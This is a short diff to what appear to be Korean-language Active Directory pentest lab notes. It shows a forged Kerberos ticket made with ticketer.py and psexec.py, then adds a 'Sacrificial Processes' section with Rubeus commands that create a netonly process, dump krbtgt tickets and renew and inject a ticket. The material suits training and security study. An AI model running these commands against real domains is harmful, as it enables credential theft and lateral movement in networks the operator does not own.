@@ -68,4 +68,18 @@ ticketer.py -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-297478
 
 export KRB5CCNAME=./Administrator.ccache
 
-psexec.py -k -no-pass sql01.inlanefreight.local```
+psexec.py -k -no-pass sql01.inlanefreight.local
+```
+
+## Sacrificial Processes
+- 기존의 세션을 보존하기 위한 방법.
+```powershell
+.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+```powershell
+.\Rubeus.exe triage
+
+.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
+
+.\Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
+```
